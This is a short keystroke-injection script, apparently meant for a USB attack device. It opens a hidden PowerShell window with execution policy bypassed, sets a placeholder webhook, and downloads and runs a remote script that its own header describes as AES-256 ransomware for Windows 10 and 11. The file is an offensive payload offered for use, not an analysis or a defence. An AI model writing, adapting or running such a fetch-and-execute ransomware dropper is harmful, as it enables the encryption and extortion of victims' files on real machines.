// Title: beigeworm's Ransomware
// Author: @beigeworm
// Description: Ransomware in Powershell - Using AES 256bit Encryption 
// Target: Windows 10 and 11


// MORE INFO - https://github.com/beigeworm/PwnPi-OLED-Build-Guide

// script setup
layout("us")

// Open Powershell
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';");
delay(500);
type("irm https://raw.githubusercontent.com/beigew0rm/PoshCryptor/main/Encryption/Encryptor.ps1 | iex");
press("ENTER");
